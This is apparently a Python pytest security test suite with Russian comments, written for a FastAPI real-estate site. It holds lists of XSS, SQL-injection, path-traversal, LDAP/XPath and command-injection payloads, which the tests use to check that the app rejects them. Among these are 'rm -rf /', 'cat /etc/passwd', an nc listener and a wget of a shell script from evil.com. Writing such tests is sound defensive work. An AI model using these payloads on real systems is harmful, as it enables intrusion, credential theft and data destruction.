"""
Тесты безопасности для проверки уязвимостей
"""

import pytest
import requests
import json
import time
from urllib.parse import quote
from fastapi.testclient import TestClient


class TestXSSProtection:
    """Тесты защиты от XSS атак"""
    
    def test_xss_in_search_query(self, client: TestClient):
        """Тест XSS в поисковом запросе"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<style>@import'javascript:alert(\"XSS\")';</style>"
        ]
        
        for payload in xss_payloads:
            response = client.get(f"/ru/search?q={quote(payload)}")
            
            # Проверяем, что XSS не выполнился
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                content = response.text
                # Проверяем, что payload не отображается как HTML
                assert "<script>" not in content
                assert "javascript:" not in content
                assert "onerror=" not in content
                assert "onload=" not in content
    
    def test_xss_in_form_inputs(self, client: TestClient):
        """Тест XSS в формах"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for payload in xss_payloads:
            # Тест в форме контактов
            contact_data = {
                "name": payload,
                "email": "test@example.com",
                "phone": "+1234567890",
                "message": "Test message"
            }
            
            response = client.post("/ru/contacts", data=contact_data)
            
            if response.status_code == 200:
                content = response.text
                # Проверяем, что payload не отображается как HTML
                assert "<script>" not in content
                assert "javascript:" not in content
    
    def test_xss_in_user_input(self, client: TestClient):
        """Тест XSS в пользовательском вводе"""
        xss_payload = "<script>alert('XSS')</script>"
        
        # Тест в форме регистрации
        user_data = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "password123",
            "full_name": xss_payload,  # XSS в имени
            "phone": "+1234567890"
        }
        
        response = client.post("/api/auth/register", json=user_data)
        
        if response.status_code == 201:
            # Получаем созданного пользователя
            user_response = client.get("/api/auth/me")
            if user_response.status_code == 200:
                user_data_response = user_response.json()
                full_name = user_data_response.get("full_name", "")
                
                # Проверяем, что XSS не выполнился
                assert "<script>" not in full_name
                assert "javascript:" not in full_name


class TestSQLInjectionProtection:
    """Тесты защиты от SQL инъекций"""
    
    def test_sql_injection_in_login(self, client: TestClient):
        """Тест SQL инъекции в форме входа"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' UNION SELECT username, password FROM users --"
        ]
        
        for payload in sql_payloads:
            login_data = {
                "username": payload,
                "password": "test123"
            }
            
            response = client.post("/api/auth/login", data=login_data)
            
            # Должен быть 401 (неверные данные) или 400 (неверный формат)
            assert response.status_code in [401, 400, 422]
            
            # Не должно быть 500 (внутренняя ошибка сервера)
            assert response.status_code != 500
    
    def test_sql_injection_in_search(self, client: TestClient):
        """Тест SQL инъекции в поиске"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE properties; --",
            "' UNION SELECT * FROM properties --",
            "test'--",
            "test' /*"
        ]
        
        for payload in sql_payloads:
            response = client.get(f"/ru/search?q={quote(payload)}")
            
            # Должен быть 200 (результаты) или 400 (неверный запрос)
            assert response.status_code in [200, 400, 422]
            
            # Не должно быть 500
            assert response.status_code != 500
    
    def test_sql_injection_in_filters(self, client: TestClient):
        """Тест SQL инъекции в фильтрах"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE properties; --",
            "test'--"
        ]
        
        for payload in sql_payloads:
            response = client.get(f"/ru/properties?district={quote(payload)}")
            
            # Должен быть 200 или 400
            assert response.status_code in [200, 400, 422]
            assert response.status_code != 500


class TestCSRFProtection:
    """Тесты защиты от CSRF атак"""
    
    def test_csrf_token_required(self, client: TestClient):
        """Тест обязательности CSRF токена"""
        # Попытка отправить форму без CSRF токена
        form_data = {
            "name": "Test User",
            "email": "test@example.com",
            "message": "Test message"
        }
        
        response = client.post("/ru/contacts", data=form_data)
        
        # Должен быть 400 или 403 (отсутствует CSRF токен)
        assert response.status_code in [400, 403, 422]
    
    def test_csrf_token_validation(self, client: TestClient):
        """Тест валидации CSRF токена"""
        # Получаем страницу с формой для получения CSRF токена
        response = client.get("/ru/contacts")
        assert response.status_code == 200
        
        # Извлекаем CSRF токен из HTML
        content = response.text
        csrf_token = None
        
        # Ищем CSRF токен в HTML
        if 'name="csrf_token"' in content:
            # Простая экстракция токена
            start = content.find('name="csrf_token"')
            if start != -1:
                value_start = content.find('value="', start)
                if value_start != -1:
                    value_start += 7
                    value_end = content.find('"', value_start)
                    if value_end != -1:
                        csrf_token = content[value_start:value_end]
        
        if csrf_token:
            # Отправляем форму с правильным токеном
            form_data = {
                "name": "Test User",
                "email": "test@example.com",
                "message": "Test message",
                "csrf_token": csrf_token
            }
            
            response = client.post("/ru/contacts", data=form_data)
            
            # Должен быть 200 или 302 (успех)
            assert response.status_code in [200, 302]
        
        # Отправляем форму с неправильным токеном
        form_data = {
            "name": "Test User",
            "email": "test@example.com",
            "message": "Test message",
            "csrf_token": "invalid_token"
        }
        
        response = client.post("/ru/contacts", data=form_data)
        
        # Должен быть 400 или 403 (неверный токен)
        assert response.status_code in [400, 403, 422]


class TestPathTraversalProtection:
    """Тесты защиты от Path Traversal атак"""
    
    def test_path_traversal_in_file_access(self, client: TestClient):
        """Тест Path Traversal при доступе к файлам"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam"
        ]
        
        for payload in path_traversal_payloads:
            # Тестируем доступ к статическим файлам
            response = client.get(f"/static/{payload}")
            
            # Должен быть 404 или 403
            assert response.status_code in [404, 403, 400]
            
            # Не должно быть 200 (успешный доступ к файлу)
            assert response.status_code != 200
    
    def test_path_traversal_in_uploads(self, client: TestClient):
        """Тест Path Traversal в загрузке файлов"""
        malicious_filename = "../../../etc/passwd"
        
        # Попытка загрузить файл с malicious именем
        files = {
            'file': (malicious_filename, b'test content', 'text/plain')
        }
        
        response = client.post("/api/upload", files=files)
        
        # Должен быть 400 или 422 (неверное имя файла)
        assert response.status_code in [400, 422, 403]


class TestInjectionProtection:
    """Тесты защиты от различных инъекций"""
    
    def test_command_injection(self, client: TestClient):
        """Тест Command Injection"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l 4444",
            "&& wget http://evil.com/shell.sh"
        ]
        
        for payload in command_injection_payloads:
            # Тестируем в различных полях
            test_data = {
                "name": payload,
                "email": "test@example.com",
                "message": "Test message"
            }
            
            response = client.post("/ru/contacts", data=test_data)
            
            # Должен быть 400 или 422 (неверные данные)
            assert response.status_code in [400, 422, 403]
    
    def test_ldap_injection(self, client: TestClient):
        """Тест LDAP Injection"""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*))%00",
            "*)(|(password=*))",
            "*)(|(objectclass=*))",
            "*)(|(cn=*))",
            "*)(|(mail=*))"
        ]
        
        for payload in ldap_payloads:
            # Тестируем в поиске пользователей
            response = client.get(f"/api/users/search?q={quote(payload)}")
            
            # Должен быть 200 (пустой результат) или 400
            assert response.status_code in [200, 400, 422]
    
    def test_xpath_injection(self, client: TestClient):
        """Тест XPath Injection"""
        xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "' or 'a'='a",
            "'] | //user[username='admin",
            "' or 1=1] | //user[username='admin"
        ]
        
        for payload in xpath_payloads:
            # Тестируем в поиске
            response = client.get(f"/ru/search?q={quote(payload)}")
            
            # Должен быть 200 или 400
            assert response.status_code in [200, 400, 422]


class TestAuthenticationSecurity:
    """Тесты безопасности аутентификации"""
    
    def test_brute_force_protection(self, client: TestClient):
        """Тест защиты от брутфорса"""
        login_data = {
            "username": "testuser",
            "password": "wrongpassword"
        }
        
        # Попытка множественных неудачных входов
        for i in range(10):
            response = client.post("/api/auth/login", data=login_data)
            
            if i < 5:
                # Первые попытки должны быть 401
                assert response.status_code == 401
            else:
                # После 5 попыток должен быть 429 (rate limit) или 403
                assert response.status_code in [429, 403, 401]
    
    def test_password_strength(self, client: TestClient):
        """Тест сложности паролей"""
        weak_passwords = [
            "123",
            "password",
            "qwerty",
            "123456",
            "abc123",
            "password123",
            "admin",
            "test"
        ]
        
        for weak_password in weak_passwords:
            user_data = {
                "username": "testuser",
                "email": "test@example.com",
                "password": weak_password,
                "full_name": "Test User",
                "phone": "+1234567890"
            }
            
            response = client.post("/api/auth/register", json=user_data)
            
            # Должен быть 422 (неверный формат) из-за слабого пароля
            assert response.status_code == 422
    
    def test_session_security(self, client: TestClient):
        """Тест безопасности сессий"""
        # Регистрируем пользователя
        user_data = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "StrongPassword123!",
            "full_name": "Test User",
            "phone": "+1234567890"
        }
        
        register_response = client.post("/api/auth/register", json=user_data)
        assert register_response.status_code == 201
        
        # Логинимся
        login_data = {
            "username": user_data["username"],
            "password": user_data["password"]
        }
        
        login_response = client.post("/api/auth/login", data=login_data)
        assert login_response.status_code == 200
        
        # Получаем токен
        token = login_response.json().get("access_token")
        assert token is not None
        
        # Проверяем доступ к защищенному ресурсу
        headers = {"Authorization": f"Bearer {token}"}
        protected_response = client.get("/api/auth/me", headers=headers)
        assert protected_response.status_code == 200
        
        # Проверяем с неверным токеном
        wrong_headers = {"Authorization": "Bearer wrong_token"}
        wrong_response = client.get("/api/auth/me", headers=wrong_headers)
        assert wrong_response.status_code == 401


class TestAuthorizationSecurity:
    """Тесты безопасности авторизации"""
    
    def test_unauthorized_access(self, client: TestClient):
        """Тест неавторизованного доступа"""
        protected_endpoints = [
            "/api/admin/dashboard",
            "/api/admin/users",
            "/api/admin/properties",
            "/api/favorites/",
            "/api/auth/me"
        ]
        
        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            
            # Должен быть 401 (неавторизован) или 403 (запрещено)
            assert response.status_code in [401, 403]
    
    def test_admin_access_control(self, authenticated_client: TestClient):
        """Тест контроля доступа к админке"""
        admin_endpoints = [
            "/api/admin/dashboard",
            "/api/admin/users",
            "/api/admin/properties",
            "/api/admin/analytics"
        ]
        
        for endpoint in admin_endpoints:
            response = authenticated_client.get(endpoint)
            
            # Обычный пользователь не должен иметь доступ к админке
            assert response.status_code in [403, 401]
    
    def test_resource_ownership(self, authenticated_client: TestClient, test_property_data):
        """Тест владения ресурсами"""
        # Создаем объект недвижимости
        create_response = authenticated_client.post("/api/properties/", json=test_property_data)
        assert create_response.status_code == 201
        property_id = create_response.json()["id"]
        
        # Пытаемся получить доступ к чужому объекту
        other_property_id = property_id + 1000  # Несуществующий ID
        
        response = authenticated_client.get(f"/api/properties/{other_property_id}")
        
        # Должен быть 404 (не найден) или 403 (запрещено)
        assert response.status_code in [404, 403]


class TestInputValidation:
    """Тесты валидации входных данных"""
    
    def test_email_validation(self, client: TestClient):
        """Тест валидации email"""
        invalid_emails = [
            "invalid-email",
            "test@",
            "@example.com",
            "test..test@example.com",
            "test@example..com",
            "test@.com",
            "test@example.",
            "test example@example.com",
            "test@example.com.",
            "test@example.com.."
        ]
        
        for invalid_email in invalid_emails:
            user_data = {
                "username": "testuser",
                "email": invalid_email,
                "password": "StrongPassword123!",
                "full_name": "Test User",
                "phone": "+1234567890"
            }
            
            response = client.post("/api/auth/register", json=user_data)
            
            # Должен быть 422 (неверный формат)
            assert response.status_code == 422
    
    def test_phone_validation(self, client: TestClient):
        """Тест валидации телефона"""
        invalid_phones = [
            "123",
            "abc",
            "+123",
            "123456789",
            "12345678901234567890",
            "++1234567890",
            "+1234567890abc"
        ]
        
        for invalid_phone in invalid_phones:
            user_data = {
                "username": "testuser",
                "email": "test@example.com",
                "password": "StrongPassword123!",
                "full_name": "Test User",
                "phone": invalid_phone
            }
            
            response = client.post("/api/auth/register", json=user_data)
            
            # Должен быть 422 (неверный формат)
            assert response.status_code == 422
    
    def test_file_upload_validation(self, client: TestClient):
        """Тест валидации загрузки файлов"""
        # Попытка загрузить файл с неверным расширением
        files = {
            'file': ('test.exe', b'test content', 'application/octet-stream')
        }
        
        response = client.post("/api/upload", files=files)
        
        # Должен быть 400 или 422 (неверный тип файла)
        assert response.status_code in [400, 422, 403]
        
        # Попытка загрузить слишком большой файл
        large_content = b'x' * (10 * 1024 * 1024)  # 10MB
        files = {
            'file': ('test.jpg', large_content, 'image/jpeg')
        }
        
        response = client.post("/api/upload", files=files)
        
        # Должен быть 413 (слишком большой) или 400
        assert response.status_code in [413, 400, 422]


class TestRateLimiting:
    """Тесты ограничения скорости запросов"""
    
    def test_api_rate_limiting(self, client: TestClient):
        """Тест ограничения скорости для API"""
        # Множественные запросы к API
        for i in range(20):
            response = client.get("/api/properties/")
            
            if i < 15:
                # Первые запросы должны проходить
                assert response.status_code in [200, 404]
            else:
                # После лимита должен быть 429
                assert response.status_code in [429, 200, 404]
    
    def test_login_rate_limiting(self, client: TestClient):
        """Тест ограничения скорости для входа"""
        login_data = {
            "username": "testuser",
            "password": "wrongpassword"
        }
        
        # Множественные попытки входа
        for i in range(10):
            response = client.post("/api/auth/login", data=login_data)
            
            if i < 5:
                # Первые попытки должны быть 401
                assert response.status_code == 401
            else:
                # После лимита должен быть 429
                assert response.status_code in [429, 401]


class TestHeadersSecurity:
    """Тесты безопасности заголовков"""
    
    def test_security_headers(self, client: TestClient):
        """Тест безопасности заголовков"""
        response = client.get("/ru")
        
        # Проверяем наличие security headers
        headers = response.headers
        
        # X-Frame-Options для защиты от clickjacking
        assert "X-Frame-Options" in headers or "Content-Security-Policy" in headers
        
        # X-Content-Type-Options для защиты от MIME sniffing
        assert "X-Content-Type-Options" in headers
        
        # X-XSS-Protection для защиты от XSS
        assert "X-XSS-Protection" in headers
        
        # Strict-Transport-Security для HTTPS
        # assert "Strict-Transport-Security" in headers  # Может отсутствовать в dev
    
    def test_cors_headers(self, client: TestClient):
        """Тест CORS заголовков"""
        # OPTIONS запрос для проверки CORS
        response = client.options("/api/properties/")
        
        headers = response.headers
        
        # Проверяем CORS заголовки
        if "Access-Control-Allow-Origin" in headers:
            origin = headers["Access-Control-Allow-Origin"]
            assert origin in ["*", "http://localhost:3000", "https://sianoro.com"]
        
        if "Access-Control-Allow-Methods" in headers:
            methods = headers["Access-Control-Allow-Methods"]
            assert "GET" in methods
            assert "POST" in methods


class TestLoggingSecurity:
    """Тесты безопасности логирования"""
    
    def test_sensitive_data_logging(self, client: TestClient):
        """Тест логирования чувствительных данных"""
        # Попытка входа с чувствительными данными
        login_data = {
            "username": "admin",
            "password": "secret_password_123"
        }
        
        response = client.post("/api/auth/login", data=login_data)
        
        # Проверяем, что пароль не логируется в ответе
        assert response.status_code in [401, 400, 422]
        
        # Проверяем, что в ответе нет пароля
        if response.status_code == 422:
            error_data = response.json()
            error_str = str(error_data)
            assert "secret_password_123" not in error_str
    
    def test_error_information_disclosure(self, client: TestClient):
        """Тест раскрытия информации об ошибках"""
        # Попытка доступа к несуществующему ресурсу
        response = client.get("/api/nonexistent")
        
        # Проверяем, что не раскрывается внутренняя информация
        assert response.status_code in [404, 405]
        
        if response.status_code == 404:
            error_data = response.json()
            # Не должно быть детальной информации об ошибке
            assert "detail" in error_data
            detail = error_data["detail"]
            
            # Не должно быть stack trace или внутренних путей
            assert "traceback" not in detail.lower()
            assert "file:" not in detail.lower()
            assert "line:" not in detail.lower() 